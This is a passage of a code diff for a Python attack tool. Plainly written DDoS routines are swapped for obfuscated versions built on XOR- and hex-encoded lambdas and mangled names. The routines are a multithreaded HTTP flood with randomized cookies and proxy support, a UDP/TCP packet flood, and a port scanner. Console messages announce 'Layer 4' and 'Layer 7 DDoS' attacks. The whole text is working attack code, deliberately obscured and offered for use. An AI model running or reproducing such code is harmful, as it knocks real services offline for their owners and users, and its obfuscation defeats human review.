+                    IlIIllIIIllll[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('65696b6f6f43')] = f"session={IlIIIIlIlllIIIlllllI(IIIllIIlIlIIlIIlllllI(0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('34'), 16) << 0 .__class__((lambda n: int.__xor__(n, 235).to_bytes(1, 'big').decode())(216), 16) | 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 42)) for IlIlIllIlIIlIlllI in x)))([26]), 16))).hexdigest()}; pref={IIlIlIIllllllIllllIlI([(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 157) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('f1f4faf5e9'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 228 for IlIlIIlIlIllllI in x[::-1]]).decode())([143, 150, 133, 128])])}; lang={IIlIlIIllllllIllllIlI([(lambda n: int.__xor__(n, 32767).to_bytes(2, 'big').decode())(6801), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 230 for IlIlIIlIlIllllI in x[::-1]]).decode())([138, 150]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 221 for IlIlIIlIlIllllI in x[::-1]]).decode())([184, 185])])}"
+                    lIIlllIIlIllllIIIIIll = [(lambda n: int.__xor__(n, 2497037).to_bytes(3, 'big').decode())(6381401), (lambda n: int.__xor__(n, 1179849577).to_bytes(4, 'big').decode())(370950205), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('44414548'), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 130 for IlIlIIlIlIllllI in x[::-1]]).decode())([209, 204, 205, 203, 214, 210, 205]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 55 for IlIlIIlIlIllllI in x[::-1]]).decode())([99, 98, 103])]
+                    IlIllIllIlIlIllIIll = IIlIlIIllllllIllllIlI(lIIlllIIlIllllIIIIIll)
+                    IllIllIllIllIIIIlIIllI = {(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 235 for IlIlIIlIlIllllI in x[::-1]]).decode())([138, 159, 138, 143]): IIlIlIIllllllIllllIlI([(lambda n: int.__xor__(n, 225659017620).to_bytes(5, 'big').decode())(381802524922), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 126 for IlIlIIlIlIllllI in x[::-1]]).decode())([22, 29, 12, 31, 27, 13]), (lambda n: int.__xor__(n, 684008052105).to_bytes(5, 'big').decode())(1023132035056), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 121)) for IlIlIllIlIIlIlllI in x)))([24, 26, 13, 16, 22, 23]), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('74696d627573')]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 114 for IlIlIIlIlIllllI in x[::-1]]).decode())([23, 7, 30, 19, 4]): lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('727473')](IlIIIlIlIlIIlIlI(0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 189 for IlIlIIlIlIllllI in x[::-1]]).decode())([143]), 16) * 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 248 for IlIlIIlIlIllllI in x[::-1]]).decode())([204, 158, 201]), 16) + 0 .__class__((lambda n: int.__xor__(n, 53).to_bytes(1, 'big').decode())(5), 16), 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 211 for IlIlIIlIlIllllI in x[::-1]]).decode())([234]), 16) * 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 44 for IlIlIIlIlIllllI in x[::-1]]).decode())([27, 28, 30, 110, 29]), 16) + 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 50) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('02'), 16))), (lambda n: int.__xor__(n, 3670615218493220458463).to_bytes(9, 'big').decode())(3294286722259226813103): lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 255) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('8c8b8d')](lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 4)) for IlIlIllIlIIlIlllI in x)))([109, 106, 112])](llIIIllIlIIIIlIIllllIllI())), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 136) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('fae9e6ece7e5'): IlIIIIlIlllIIIlllllI(IIIllIIlIlIIlIIlllllI(0 .__class__((lambda n: int.__xor__(n, 6696629).to_bytes(3, 'big').decode())(5707395), 16) - 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('363731'), 16))).hexdigest(), (lambda n: int.__xor__(n, 808169681134).to_bytes(5, 'big').decode())(860163790208): IlIIlIllIllllIlllIlII(IIIllIIlIlIIlIIlllllI(0 .__class__((lambda n: int.__xor__(n, 40).to_bytes(1, 'big').decode())(16), 16) << 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('32'), 16) | 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 59)) for IlIlIllIlIIlIlllI in x)))([11]), 16))).hexdigest()}
+                    if proxy:
+                        IIIIIlllllllllIlIIllI = {(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 170) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('c2dededa'): f'http://{proxy}', (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 128) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e8f4f4f0f3'): f'https://{proxy}'}
+                        if IlIllIllIlIlIllIIll in [(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 169 for IlIlIIlIlIllllI in x[::-1]]).decode())([253, 250, 230, 249]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 77)) for IlIlIllIlIIlIlllI in x)))([29, 24, 25])]:
+                            llIlIIlIllIIlIIllI = lllIlIlIlIlllllll.request(IlIllIllIlIlIllIIll, target, headers=IlIIllIIIllll, data=IllIllIllIllIIIIlIIllI, proxies=IIIIIlllllllllIlIIllI, timeout=0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 19) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('57'), 16) * 0 .__class__((lambda n: int.__xor__(n, 180).to_bytes(1, 'big').decode())(132), 16) + 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 96)) for IlIlIllIlIIlIlllI in x)))([83]), 16), verify=False)
+                        else:
+                            llIlIIlIllIIlIIllI = lllIlIlIlIlllllll.request(IlIllIllIlIlIllIIll, target, headers=IlIIllIIIllll, proxies=IIIIIlllllllllIlIIllI, timeout=0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 88)) for IlIlIllIlIIlIlllI in x)))([106]), 16) * 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 253) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('cc'), 16) + 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 13)) for IlIlIllIlIIlIlllI in x)))([60]), 16), verify=False)
+                    elif IlIllIllIlIlIllIIll in [(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 63) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('6f706c6b'), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 94)) for IlIlIllIlIIlIlllI in x)))([14, 11, 10])]:
+                        llIlIIlIllIIlIIllI = lllIlIlIlIlllllll.request(IlIllIllIlIlIllIIll, target, headers=IlIIllIIIllll, data=IllIllIllIllIIIIlIIllI, timeout=0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 21 for IlIlIIlIlIllllI in x[::-1]]).decode())([116, 38]), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 108)) for IlIlIllIlIIlIlllI in x)))([95, 85]), 16), verify=False)
+                    else:
+                        llIlIIlIllIIlIIllI = lllIlIlIlIlllllll.request(IlIllIllIlIlIllIIll, target, headers=IlIIllIIIllll, timeout=0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 158) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('dd'), 16) * 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 43) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('1b'), 16) + 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('33'), 16), verify=False)
+                    with IllIllllIIIIIlIlllllIIIIIII:
+                        IlIllIllIlIIlIIIIlIIIIlll += 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 113) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('403330'), 16) - 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 23) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('26552e'), 16)
+                        sys.stdout.write(f'\r{Fore.GREEN}[+] Requests sent: {IlIllIllIlIIlIIIIlIIIIlll} | Status: {llIlIIlIllIIlIIllI.status_code} | Method: {IlIllIllIlIlIllIIll}')
+                        sys.stdout.flush()
+                except Exception as e:
+                    pass
+        IIIIlIIIlIlIlIIlllI = []
+        for _ in lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 103)) for IlIlIllIlIIlIlllI in x)))([21, 6, 9, 0, 2])](lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 139 for IlIlIIlIlIllllI in x[::-1]]).decode())([229, 226, 230])](threads, 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('663033'), 16) - 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 18)) for IlIlIllIlIIlIlllI in x)))([35, 35, 80]), 16))):
+            IIIIIIIlIIIIIllIlllllllIll = lIllIIIIIIIIIIIlIIll(target=IIIIIIIllllIlllIIIlI)
+            IIIIIIIlIIIIIllIlllllllIll.daemon = True
+            IIIIIIIlIIIIIllIlllllllIll.start()
+            IIIIlIIIlIlIlIIlllI.append(IIIIIIIlIIIIIllIlllllllIll)
+        IlllIIlIIllll(duration)
+        llllIIlIIlIIIIlllllIIIll = True
+        for IIIIIIIlIIIIIllIlllllllIll in IIIIlIIIlIlIlIIlllI:
+            IIIIIIIlIIIIIllIlllllllIll.join()
+        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'\n{Fore.CYAN}[+] Layer 7 DDoS Attack Completed!')
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 91) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('2b2932352f')](f'{Fore.CYAN}[+] Total requests sent: {IlIllIllIlIIlIIIIlIIIIlll}')
+
+    def llIIllllllllllIIlIIIlIl(self, lIlIllIlllIl, port, duration, protocol=(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 29)) for IlIlIllIlIIlIlllI in x)))([105, 126, 109])):
+        if not self.IlIIIllllIllIIIlIlIllll(lIlIllIlllIl):
+            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 957345901058).to_bytes(5, 'big').decode())(749810107510)](f'{Fore.RED}[-] Invalid IP address!')
+            return
+        if not 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 169 for IlIlIIlIlIllllI in x[::-1]]).decode())([155, 155, 152]), 16) - 0 .__class__((lambda n: int.__xor__(n, 1203020).to_bytes(3, 'big').decode())(2320765), 16) <= port <= 0 .__class__((lambda n: int.__xor__(n, 2103344160).to_bytes(4, 'big').decode())(1243105891), 16) ^ 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 156) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a4aca5af'), 16):
+            lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 82)) for IlIlIllIlIIlIlllI in x)))([34, 32, 59, 60, 38])](f'{Fore.RED}[-] Invalid port number! Must be between 1-65535')
+            return
+        global IlIllIllIlIIlIIIIlIIIIlll, llllIIlIIlIIIIlllllIIIll
+        llllIIlIIlIIIIlllllIIIll = False
+        IlIllIllIlIIlIIIIlIIIIlll = 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 62) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('0608'), 16) ^ 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 180 for IlIlIIlIlIllllI in x[::-1]]).decode())([130, 140]), 16)
+        IlIIlIIIIIlIIIIlIlIIIlIllI = llIIIllIlIIIIlIIllllIllI() + duration
+        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 125 for IlIlIIlIlIllllI in x[::-1]]).decode())([9, 19, 20, 15, 13])](f'{Fore.RED}[+] Starting Layer 4 {protocol.upper()} DDoS on {lIlIllIlllIl}:{port}')
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 887182421979).to_bytes(5, 'big').decode())(819841204655)](f'{Fore.RED}[+] Attack duration: {duration} seconds')
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 115)) for IlIlIllIlIIlIlllI in x)))([3, 1, 26, 29, 7])](f'{Fore.RED}[+] Protocol: {protocol.upper()}')
+
+        def IIIIllIlIIIIIIlII():
+            global IlIllIllIlIIlIIIIlIIIIlll, llllIIlIIlIIIIlllllIIIll
+            while llIIIllIlIIIIlIIllllIllI() < IlIIlIIIIIlIIIIlIlIIIlIllI and (not llllIIlIIlIIIIlllllIIIll):
+                try:
+                    IllIIIllIlIl = IlIIIlIlIlIIlIlI(0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('653231'), 16) - 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 163) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('c6c6'), 16), 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 81 for IlIlIIlIlIllllI in x[::-1]]).decode())([102, 99, 104]), 16) - 0 .__class__((lambda n: int.__xor__(n, 5069523).to_bytes(3, 'big').decode())(8153316), 16))
+                    IllIllIllIllIIIIlIIllI = IIIllIIlIlIIlIIlllllI(IllIIIllIlIl)
+                    if protocol.lower() == (lambda n: int.__xor__(n, 15057684).to_bytes(3, 'big').decode())(9480036):
+                        sock = lIllIlIIlIIlIIIlllIlIll(socket.AF_INET, socket.SOCK_DGRAM)
+                        sock.sendto(IllIllIllIllIIIIlIIllI, (lIlIllIlllIl, port))
                         sock.close()
-                    else:  # TCP
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(1)
+                    else:
+                        sock = lIllIlIIlIIlIIIlllIlIll(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(0 .__class__((lambda n: int.__xor__(n, 159).to_bytes(1, 'big').decode())(222), 16) * 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 62) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('0e'), 16) + 0 .__class__((lambda n: int.__xor__(n, 23).to_bytes(1, 'big').decode())(38), 16))
                         try:
-                            sock.connect((ip, port))
-                            sock.send(payload)
+                            sock.connect((lIlIllIlllIl, port))
+                            sock.send(IllIllIllIllIIIIlIIllI)
                         except:
                             pass
                         finally:
                             sock.close()
-                    
-                    with lock:
-                        packet_count += 1
-                        if packet_count % 100 == 0:
-                            sys.stdout.write(f"\r{Fore.GREEN}[+] {protocol.upper()} packets sent: {packet_count}")
+                    with IllIllllIIIIIlIlllllIIIIIII:
+                        IlIllIllIlIIlIIIIlIIIIlll += 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 87)) for IlIlIllIlIIlIlllI in x)))([103]), 16) << 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('31'), 16) | 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('31'), 16)
+                        if IlIllIllIlIIlIIIIlIIIIlll % (0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('63'), 16) << 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('33'), 16) | 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('34'), 16)) == 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 77 for IlIlIIlIlIllllI in x[::-1]]).decode())([126, 14]), 16) ^ 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3363'), 16):
+                            sys.stdout.write(f'\r{Fore.GREEN}[+] {protocol.upper()} packets sent: {IlIllIllIlIIlIIIIlIIIIlll}')
                             sys.stdout.flush()
-                            
                 except:
                     pass
-        
-        # Start threads
-        thread_list = []
-        thread_count = 200 if protocol.lower() == "udp" else 100
-        
-        print(f"{Fore.RED}[+] Starting {thread_count} threads for L4 attack")
-        
-        for _ in range(thread_count):
-            thread = threading.Thread(target=send_packets)
-            thread.daemon = True
-            thread.start()
-            thread_list.append(thread)
-        
-        # Monitor progress
-        start_time = time.time()
-        while time.time() < end_time and not stop_attack:
-            time.sleep(1)
-            elapsed = time.time() - start_time
-            if elapsed > 0:
-                rate = packet_count / elapsed
-                sys.stdout.write(f"\r{Fore.GREEN}[+] Packets: {packet_count} | Rate: {rate:.0f} pkt/s")
+        IIIIlIIIlIlIlIIlllI = []
+        IIlIIllIIIIIlIlIlIIlIIIllII = 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 9) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('386c3d'), 16) ^ 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 139 for IlIlIIlIlIllllI in x[::-1]]).decode())([200, 185, 186]), 16) if protocol.lower() == (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('706475') else 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 79 for IlIlIIlIlIllllI in x[::-1]]).decode())([119, 10]), 16) - 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 176 for IlIlIIlIlIllllI in x[::-1]]).decode())([132, 136]), 16)
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 36119748057).to_bytes(5, 'big').decode())(515841651629)](f'{Fore.RED}[+] Starting {IIlIIllIIIIIlIlIlIIlIIIllII} threads for L4 attack')
+        for _ in lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 176 for IlIlIIlIlIllllI in x[::-1]]).decode())([213, 215, 222, 209, 194])](IIlIIllIIIIIlIlIlIIlIIIllII):
+            IIIIIIIlIIIIIllIlllllllIll = lIllIIIIIIIIIIIlIIll(target=IIIIllIlIIIIIIlII)
+            IIIIIIIlIIIIIllIlllllllIll.daemon = True
+            IIIIIIIlIIIIIllIlllllllIll.start()
+            IIIIlIIIlIlIlIIlllI.append(IIIIIIIlIIIIIllIlllllllIll)
+        IIlIIIlIIlllIlllIlllllIII = llIIIllIlIIIIlIIllllIllI()
+        while llIIIllIlIIIIlIIllllIllI() < IlIIlIIIIIlIIIIlIlIIIlIllI and (not llllIIlIIlIIIIlllllIIIll):
+            IlllIIlIIllll(0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3139'), 16) - 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3039'), 16))
+            IIlllllIIIlIl = llIIIllIlIIIIlIIllllIllI() - IIlIIIlIIlllIlllIlllllIII
+            if IIlllllIIIlIl > 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3066'), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 49)) for IlIlIllIlIIlIlllI in x)))([119, 1]), 16):
+                lllIlllIIIlIllIllIIlIlII = IlIllIllIlIIlIIIIlIIIIlll / IIlllllIIIlIl
+                sys.stdout.write(f'\r{Fore.GREEN}[+] Packets: {IlIllIllIlIIlIIIIlIIIIlll} | Rate: {lllIlllIIIlIllIllIIlIlII:.0f} pkt/s')
                 sys.stdout.flush()
-        
-        stop_attack = True
-        
-        # Wait for threads to complete
-        for thread in thread_list:
-            thread.join(timeout=1)
-        
-        print(f"\n{Fore.CYAN}[+] Layer 4 {protocol.upper()} DDoS Attack Completed!")
-        print(f"{Fore.CYAN}[+] Total packets sent: {packet_count}")
-# --- INFORMATION GATHERING ---
-class InformationGathering:
+        llllIIlIIlIIIIlllllIIIll = True
+        for IIIIIIIlIIIIIllIlllllllIll in IIIIlIIIlIlIlIIlllI:
+            IIIIIIIlIIIIIllIlllllllIll.join(timeout=0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 76) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('7d0e'), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 85)) for IlIlIllIlIIlIlllI in x)))([100, 20]), 16))
+        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'\n{Fore.CYAN}[+] Layer 4 {protocol.upper()} DDoS Attack Completed!')
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 87)) for IlIlIllIlIIlIlllI in x)))([39, 37, 62, 57, 35])](f'{Fore.CYAN}[+] Total packets sent: {IlIllIllIlIIlIIIIlIIIIlll}')
+
+class lllIlIIllIlllll:
+
     @staticmethod
-    def port_scanner(ip, start_port=1, end_port=65535):
-        """Comprehensive port scanner with full range support"""
-        # Validate IP
+    def IIlllIllIllllI(lIlIllIlllIl, IlllIIllIIlllllIlIlllIIIIlI=0 .__class__((lambda n: int.__xor__(n, 53189).to_bytes(2, 'big').decode())(65156), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 72)) for IlIlIllIlIIlIlllI in x)))([121, 42]), 16), IlIlIIlIIIIIlIIlIlIlII=0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3346303031'), 16) - 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 38) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('6012'), 16)):
         try:
-            socket.inet_aton(ip)
+            llIIlllllllIIlIlI(lIlIllIlllIl)
         except socket.error:
-            print(f"{Fore.RED}[-] Invalid IP address!")
+            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Invalid IP address!')
             return []
-            
-        print(f"{Fore.CYAN}[+] Scanning ports {start_port}-{end_port} on {ip}...")
-        open_ports = []
-        
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 107)) for IlIlIllIlIIlIlllI in x)))([27, 25, 2, 5, 31])](f'{Fore.CYAN}[+] Scanning ports {IlllIIllIIlllllIlIlllIIIIlI}-{IlIlIIlIIIIIlIIlIlIlII} on {lIlIllIlllIl}...')
+        lIlIlIIlllllIIlIIIl = []
         try:
-            for port in range(start_port, min(end_port + 1, 65536)):
+            for port in lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 149 for IlIlIIlIlIllllI in x[::-1]]).decode())([240, 242, 251, 244, 231])](IlllIIllIIlllllIlIlllIIIIlI, lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 26)) for IlIlIllIlIIlIlllI in x)))([119, 115, 116])](IlIlIIlIIIIIlIIlIlIlII + (0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 44)) for IlIlIllIlIIlIlllI in x)))([30]), 16) * 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 71)) for IlIlIllIlIIlIlllI in x)))([119]), 16) + 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 43)) for IlIlIllIlIIlIlllI in x)))([26]), 16)), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 37)) for IlIlIllIlIIlIlllI in x)))([20, 21, 20, 70, 28]), 16) - 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 146 for IlIlIIlIlIllllI in x[::-1]]).decode())([171, 241, 163]), 16))):
                 try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(0.1)
-                    result = sock.connect_ex((ip, port))
-                    if result == 0:
-                        service = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
-                                  80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 3389: "RDP"}.get(port, "Unknown")
-                        print(f"{Fore.GREEN}[+] Port {port} ({service}): OPEN")
-                        open_ports.append(port)
+                    sock = lIllIlIIlIIlIIIlllIlIll(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout((0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 119)) for IlIlIllIlIIlIlllI in x)))([68, 67, 50, 67, 49, 79, 51, 68, 78, 52, 52, 49, 65]), 16) ^ 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('42333030354631343338323846'), 16)) / (0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('4544344631333731383543353944'), 16) ^ 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 151 for IlIlIIlIlIllllI in x[::-1]]).decode())([210, 211, 163, 209, 166, 164, 160, 166, 175, 162, 212, 162, 174, 162]), 16)))
+                    llIIlIllIlIl = sock.connect_ex((lIlIllIlllIl, port))
+                    if llIIlIllIlIl == 0 .__class__((lambda n: int.__xor__(n, 44413).to_bytes(2, 'big').decode())(38980), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 61848).to_bytes(2, 'big').decode())(50337), 16):
